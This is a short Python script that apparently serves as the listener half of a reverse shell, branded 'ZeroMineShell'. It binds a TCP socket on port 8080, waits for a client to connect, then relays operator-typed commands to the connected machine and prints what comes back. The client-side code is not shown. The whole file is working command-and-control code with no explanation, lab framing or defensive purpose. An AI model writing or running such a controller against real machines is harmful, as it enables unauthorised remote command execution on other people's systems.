from socket import *
from colorama import Fore
import time

s = socket(AF_INET,SOCK_STREAM)

s.bind(('192.168.239.1',8080))

s.listen(2)

print(Fore.RED +" Run Server port:[8080]" )

time.sleep(2)
print(Fore.CYAN+" Plase Wait.....")

client, addr = s.accept()

print(Fore.GREEN + "Connected To " + str(addr))

while True:
    command = input(" ZeroMineShell>>").encode()
    client.send(command)
    data = client.recv(123456789).decode()
    print(data)

client.close()
